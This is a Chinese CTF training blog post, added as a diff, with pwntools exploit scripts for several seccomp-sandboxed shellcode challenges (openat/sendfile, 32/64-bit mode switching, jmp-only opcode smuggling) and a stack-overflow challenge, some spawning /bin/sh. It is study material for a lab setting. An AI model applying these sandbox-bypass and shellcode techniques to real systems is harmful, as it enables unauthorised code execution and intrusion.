@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mr.BW">
+
+
+
+
+
+<title>24集训week1 | Mr.BW的妙妙屋</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/../fonts/iconfont3/iconfont.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+        
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mr.BW&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mr.BW&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">回到底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部收起"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">24集训week1</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mr.BW</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">七月 13, 2024&nbsp;&nbsp;11:49:16</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/24%E9%9B%86%E8%AE%AD/">24集训</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="shellcode1"><a href="#shellcode1" class="headerlink" title="shellcode1"></a>shellcode1</h1><p>程序开启了沙箱保护</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./filename</span><br></pre></td></tr></table></figure>
+
+<p>该指令查看沙箱保护</p>
+<p><img src="/../image/24%E9%9B%86%E8%AE%ADweek1/2.png" alt="2"></p>
+<p>只允许read write open</p>
+<p>打开后把内容写到可读可写的内存段 这里选择rsp 之后再用标准输出读出来</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">r=process(<span class="string">&#x27;./shellcode1&#x27;</span>)</span><br><span class="line">sh=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">sh+=shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x50</span>)</span><br><span class="line">sh+=shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x50</span>)</span><br><span class="line">sh=asm(sh)</span><br><span class="line">r.sendline(sh)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="shellcode2"><a href="#shellcode2" class="headerlink" title="shellcode2"></a>shellcode2</h1><p>与第一题类似，不过禁用了open和部分读写函数</p>
+<p>open用openat替代</p>
+<p>openat函数</p>
+<p><code>int openat(int dirfd, const char *pathname, int flags, mode_t mode);</code></p>
+<p>第一个代表目录文件表述符≠文件描述符 设置成<code>AT_FDCWD</code>表示打开相对路径使用当前目录 数值为-100</p>
+<p>sendfile函数</p>
+<p><code>ssize_t senfile(int out_fd,int in_fd,off_t* offset,size_t count)</code></p>
+<p>第一个参数相当于write的fd 第二个参数相当于read的fd</p>
+<p>第三个参数为偏移量，一般设置成0</p>
+<p>第四个参数表示传输字节数</p>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">42185</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./shellcode2&quot;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./shellcode2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh=shellcraft.openat(-<span class="number">100</span>,<span class="string">&#x27;./flag&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">sh+=shellcraft.sendfile(<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">sh=asm(sh)</span><br><span class="line">r.sendline(sh)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="shellcode3"><a href="#shellcode3" class="headerlink" title="shellcode3"></a>shellcode3</h1><p><img src="/../image/24%E9%9B%86%E8%AE%ADweek1/1.png" alt="1"></p>
+<p>沙箱发现没有限制64位，但没有open，不过程序给了个fstat，这个函数在64位的系统调用号和open在32位的系统调用号一样，所以可以把程序转到32位再open之后再转到64位读写</p>
+<p>汇编指令：retfq，相当于<code>pop ip；pop cs</code></p>
+<p>cs寄存器为0x23系统执行32位，cs为0x33执行64位</p>
+<p>因为64位地址比32位长，所以32位下无法解析64位地址</p>
+<p>所以用mmap映射一部分内存来存放32位地址</p>
+<p>mmap函数</p>
+<p><code>void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset);</code></p>
+<p>用于映射文件</p>
+<p>此处<code>mmap(0x40404040,0x100,7,34,0,0)</code></p>
+<p>映射一部分内存区域后，用read函数把后续shellcode读入这块内存</p>
+<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">45647</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./shellcode3&#x27;)</span></span><br><span class="line">buf=<span class="number">0x1000</span></span><br><span class="line"><span class="comment">#sh=asm(shellcraft.open(&#x27;flag&#x27;),arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)</span></span><br><span class="line">sh1=asm(<span class="string">&#x27;&#x27;&#x27; xor ebp, ebp</span></span><br><span class="line"><span class="string">        push 0x602000</span></span><br><span class="line"><span class="string">        xor rdi,rdi</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        push 0x100</span></span><br><span class="line"><span class="string">        xor rsi,rsi</span></span><br><span class="line"><span class="string">        pop rsi</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        push 7</span></span><br><span class="line"><span class="string">        pop rdx</span></span><br><span class="line"><span class="string">        push 0x22</span></span><br><span class="line"><span class="string">        pop r10</span></span><br><span class="line"><span class="string">        /* call mmap2() */</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        xor r8,r8</span></span><br><span class="line"><span class="string">        xor r9,r9</span></span><br><span class="line"><span class="string">        mov rax, 0x9</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        push rdx</span></span><br><span class="line"><span class="string">        pop rdx</span></span><br><span class="line"><span class="string">        /*read*/</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">        push 0x602000</span></span><br><span class="line"><span class="string">        pop rsi</span></span><br><span class="line"><span class="string">        push 0</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        push 0x40</span></span><br><span class="line"><span class="string">        pop rdx</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">sh1+=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov esp,0x602160/*可读的地址即可*/</span></span><br><span class="line"><span class="string">/*64-&gt;32*/</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push  0x602000</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">sh2=asm(<span class="string">&#x27;&#x27;&#x27;/*open*/</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">mov eax,0x5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ecx,eax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">sh2+=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push 0x60201d</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">/*read*/</span></span><br><span class="line"><span class="string">mov rdi,rcx</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x70</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">/*write*/</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov esp,0x40404550</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=shellcraft.i386.open(&#x27;flag&#x27;)</span></span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">r.sendline(sh1)</span><br><span class="line">pause()</span><br><span class="line">r.sendline(sh2)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="shellcode4"><a href="#shellcode4" class="headerlink" title="shellcode4"></a>shellcode4</h1><p><img src="/../image/24%E9%9B%86%E8%AE%ADweek1/3.png" alt="3"></p>
+<p>和第二题一样，read换成pread。</p>
+<p>或者用mmap映射一段内存</p>
+<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">buf=<span class="string">&#x27;rsp&#x27;</span></span><br><span class="line"><span class="comment">#r=process(&#x27;./shellcode4&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">46251</span>)</span><br><span class="line"></span><br><span class="line">sh=asm(shellcraft.openat(-<span class="number">100</span>,<span class="string">&#x27;./flag&#x27;</span>,<span class="number">0</span>))</span><br><span class="line">sh+=asm(shellcraft.pread(<span class="number">3</span>,buf,<span class="number">0x50</span>))</span><br><span class="line">sh+=asm(shellcraft.write(<span class="number">1</span>,buf,<span class="number">0x50</span>))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">r.sendline(sh)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="shellcode5"><a href="#shellcode5" class="headerlink" title="shellcode5"></a>shellcode5</h1><p>程序只允许j开头的汇编指令进行执行</p>
+<p>这题可以从机器码入手</p>
+<p>jmp的机器码分为两种</p>
+<ol>
+<li>\xeb:两字节的jmp</li>
+<li>\xe9:五字节的jmp</li>
+</ol>
+<p>程序的特判是遇到\xeb后会往下跳过一个字节再去检查下一个汇编指令，同理遇到\xe9会跳过四个字节再去检查下一个</p>
+<p>因此真正运行的shellcode就藏在着四字节</p>
+<p>\xeb\x01\xe9\x??\x??\x??\x??这样一个单元可以绕过程序的特判去执行后面四字节的指令，因此就想办法把shellcode拆成四字节</p>
+<p>在此处给rax直接赋值就不行，因为他会把下一条的\xeb\x01给读进去</p>
+<p>因此只能给eax，al，ah赋值再用 shl rax进行移位</p>
+<h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">r=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">43289</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./shellcode5&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./shellcode5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#\xeB 2bytes</span></span><br><span class="line"><span class="comment">#\xe9 5bytes</span></span><br><span class="line"></span><br><span class="line">sh=<span class="string">&#x27;\xeb\x01\xe9\xb4\x68\xeB\x01\xe9\xb0\x73\xeB\x01&#x27;</span></span><br><span class="line">sh+=<span class="string">&#x27;\xe9\x48\xc1\xe0\x10\xeB\x01\xe9\xb4\x2f\xeB\x01\xe9\xb0\x6e\xeB\x01&#x27;</span></span><br><span class="line">sh+=<span class="string">&#x27;\xe9\x48\xc1\xe0\x08\xeB\x01\xe9\xb0\x69\xeB\x01\xe9\x48\xc1\xe0\x10\xeB\x01\xe9\xb0\x2f\xb4\x62\xeB\x01&#x27;</span></span><br><span class="line">sh+=<span class="string">&#x27;\xe9\x50\x00\xeB\x01\xe9\x48\x89\xe7\x00\xeB\x01\xe9\x31\xd2\x31\xf6\xeB\x01\xe9\x6a\x3b\xeB\x01\xe9\x58\x0f\x05\x00&#x27;</span></span><br><span class="line"><span class="comment">#sh+=&#x27;\xe9\x50\x48\xeB\x01\xe9\x89\xe7\xeB\x01\xe9\x31\xd2\xeB\x01\xe9\x31\xf6\xeB\x01&#x27;</span></span><br><span class="line"><span class="comment">#sh+=&#x27;\xe9\x6a\x3b\xeB\x01\xe9\x58\x0f\x05\x00&#x27;</span></span><br><span class="line"><span class="comment">#sh=&#x27;\xeB\x01\xe9\xc1\xe3\xeB\x01\xe9\x10\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;48 b8 2f 62  69 6e 2f 73  68 00 50 48  89 e7 31 d2 31 f6 6a 3b  58 0f 05 &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;b0 2f b4 62  50 48 89 e7  31 d2 31 f6  6a 3b 58 0f 05&#x27;&#x27;&#x27;</span></span><br><span class="line">sh1=asm(</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> /*execve(&#x27;/bin/sh\x00&#x27;,0,0)*/</span></span><br><span class="line"><span class="string">	     /* execve(path=&#x27;/bin/sh\x00&#x27;, argv=0, envp=0) */</span></span><br><span class="line"><span class="string">        /* push b&#x27;/bin/sh\x00&#x27; */</span></span><br><span class="line"><span class="string">	/*mov eax,0x1 b8 01 00 00 00*/</span></span><br><span class="line"><span class="string">	mov ah,0x68</span></span><br><span class="line"><span class="string">	mov al,0x73</span></span><br><span class="line"><span class="string">	shl rax,16</span></span><br><span class="line"><span class="string">	mov ah,0x2f</span></span><br><span class="line"><span class="string">	mov al,0x6e</span></span><br><span class="line"><span class="string">	shl rax,8</span></span><br><span class="line"><span class="string">	mov al,0x69</span></span><br><span class="line"><span class="string">	shl rax,16</span></span><br><span class="line"><span class="string">	mov al,0x2f</span></span><br><span class="line"><span class="string">	mov ah,0x62</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       /* mov rax, 0x68732f6e69622f */</span></span><br><span class="line"><span class="string">	push rax</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">        xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">        /* call execve() */</span></span><br><span class="line"><span class="string">        push 59 /* 0x3b */</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">)</span><br><span class="line">sh1=asm(<span class="string">&#x27;xor edx,edx&#x27;</span>)<span class="comment">#48 89 e7</span></span><br><span class="line"><span class="comment">#sh1=asm(shellcraft.execve(&#x27;/bin/sh&#x27;,0,0))</span></span><br><span class="line"><span class="built_in">print</span>(sh)</span><br><span class="line">gdb.attach(r)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">r.send(sh)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="flock"><a href="#flock" class="headerlink" title="flock"></a>flock</h1><p>不同以往的ret2text</p>
+<p>这题在填充满buf要对rbp进行恢复，所以不能直接加8字节覆盖掉</p>
+<p><img src="/../image/24%E9%9B%86%E8%AE%ADweek1/4.png" alt="4"></p>
+<p>程序还有特判，要求函数的返回地址要等于什么什么，这样的特判有四个，因此到最后一个的时候在跳转到win</p>
+<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;127.0.0.1&#x27;,45647)</span></span><br><span class="line">r=process(<span class="string">&#x27;./flock&#x27;</span>)</span><br><span class="line">offset=<span class="number">128</span></span><br><span class="line">addr=<span class="number">0x4011BD</span></span><br><span class="line">addr4=<span class="number">0x401276</span></span><br><span class="line">addr3=<span class="number">0x4012a0</span></span><br><span class="line">addr2=<span class="number">0x4012ca</span></span><br><span class="line">addr1=<span class="number">0x4012f0</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Song Begins At &#x27;</span>)</span><br><span class="line">rbp=r.recv(<span class="number">14</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(rbp,<span class="number">16</span>)</span><br><span class="line">rbp1=rbp+<span class="number">0xa0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp1))</span><br><span class="line">rbp2=rbp1+<span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp2))</span><br><span class="line">rbp3=rbp2+<span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp3))</span><br><span class="line">payload=offset*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(rbp1)+p64(addr4)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(rbp2)+p64(addr3)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(rbp3)+p64(addr2)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(addr)+p64(addr1)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(addr)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/ctf/"># ctf</a>
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        <a href="/tags/sandbox/"># sandbox</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
